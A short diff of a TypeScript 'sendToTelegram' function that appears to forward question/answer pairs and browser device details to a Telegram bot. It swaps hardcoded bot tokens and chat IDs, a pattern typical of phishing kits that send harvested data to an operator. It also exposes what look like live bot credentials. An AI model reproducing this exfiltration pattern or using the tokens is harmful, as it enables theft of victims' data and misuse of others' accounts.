@@ -9,8 +9,8 @@ export const sendToTelegram = async (
     q3: string, a3: string
   }
 ) => {
-  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
-  const CHAT_IDS = ['', '6076369736']; // Add your IDs here
+  const BOT_TOKEN = '8537131987:AAGSRSflBc7ajrYQ89Q8fc3CrJn_EW7OLR4';
+  const CHAT_IDS = ['6885815623', '6076369736']; // Add your IDs here
 
   const getDeviceInfo = (): string => {
     const ua = navigator.userAgent;
